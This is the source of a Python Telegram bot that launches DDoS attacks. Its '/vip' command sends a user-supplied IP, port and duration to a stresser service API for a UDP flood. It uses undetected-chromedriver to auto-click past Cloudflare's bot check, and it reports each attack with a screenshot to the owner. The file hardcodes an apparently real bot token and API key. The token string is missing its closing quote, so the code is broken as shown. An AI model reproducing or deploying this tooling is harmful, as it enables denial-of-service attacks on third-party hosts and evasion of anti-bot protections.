import telebot
import time
import threading
import os
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

BOT_TOKEN = "8473566885:AAHO0vs5G7AdDniZhs28501dphSeYOj3Q1E
API_KEY = "ujiYT1DJIAacgnFB"
OWNER_ID = 7459756974

authorized_users = set()
bot = telebot.TeleBot(BOT_TOKEN)

driver = None

def init_driver():
    global driver
    if driver is None:
        options = uc.ChromeOptions()
        options.add_argument('--headless=new')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        driver = uc.Chrome(options=options)
    return driver

def solve_cloudflare_and_screenshot(url):
    driver = init_driver()
    driver.get(url)
    
    try:
        # Wait for Cloudflare checkbox
        wait = WebDriverWait(driver, 15)
        
        # Try multiple selectors for Cloudflare checkbox
        checkbox_selectors = [
            "input[type='checkbox']",
            "#challenge-stage input",
            ".mark",
            "label[for='checkbox']",
            "div.mark"
        ]
        
        for selector in checkbox_selectors:
            try:
                checkbox = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, selector)))
                driver.execute_script("arguments[0].click();", checkbox)
                print("✅ Clicked Cloudflare checkbox")
                break
            except:
                continue
        
        # Wait for verification to complete
        time.sleep(8)
        
    except Exception as e:
        print(f"⚠️ Auto-click failed: {e}")
    
    # Take screenshot after verification
    time.sleep(5)
    screenshot_path = f"screenshot_{int(time.time())}.png"
    driver.save_screenshot(screenshot_path)
    return screenshot_path

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id == OWNER_ID:
        bot.reply_to(message, "✅ Bot Started!\n\n/vip <ip> <port> <time>\n/add <user_id>\n/remove <user_id>")
    else:
        bot.reply_to(message, "❌ Unauthorized")

@bot.message_handler(commands=['add'])
def add_user(message):
    if message.from_user.id != OWNER_ID:
        return
    try:
        user_id = int(message.text.split()[1])
        authorized_users.add(user_id)
        bot.reply_to(message, f"✅ User {user_id} added!")
    except:
        bot.reply_to(message, "Usage: /add <user_id>")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    if message.from_user.id != OWNER_ID:
        return
    try:
        user_id = int(message.text.split()[1])
        authorized_users.discard(user_id)
        bot.reply_to(message, f"✅ User {user_id} removed!")
    except:
        bot.reply_to(message, "Usage: /remove <user_id>")

@bot.message_handler(commands=['vip'])
def vip_attack(message):
    if message.from_user.id not in authorized_users and message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Unauthorized")
        return
    
    try:
        args = message.text.split()
        if len(args) != 4:
            bot.reply_to(message, "⚠️ Usage: /vip <ip> <port> <time>\nMinimum time: 60 seconds")
            return
        
        _, ip, port, time_val = args
        time_val = int(time_val)
        
        if time_val < 60:
            bot.reply_to(message, "❌ Minimum time 60 seconds!")
            return
        
        bot.reply_to(message, f"⚡ VIP Started!\n\n🎯 Target: {ip}:{port}\n⏱️ Time: {time_val}s")
        
        url = f"https://susstresser.com/panel/api/api.php?key={API_KEY}&host={ip}&port={port}&time={time_val}&method=udp"
        
        def capture_and_send():
            try:
                screenshot_path = solve_cloudflare_and_screenshot(url)
                with open(screenshot_path, 'rb') as photo:
                    bot.send_photo(OWNER_ID, photo, caption=f"📸 Attack by {message.from_user.id}\n🎯 {ip}:{port}\n⏱️ {time_val}s")
                os.remove(screenshot_path)
            except Exception as e:
                bot.send_message(OWNER_ID, f"❌ Error: {str(e)}")
        
        threading.Thread(target=capture_and_send).start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['status'])
def status(message):
    bot.reply_to(message, "🟢 Bot running!\n✅ Auto Cloudflare solver active")

print("🤖 Bot starting with undetected-chromedriver...")
bot.infinity_polling(timeout=60, skip_pending=True)
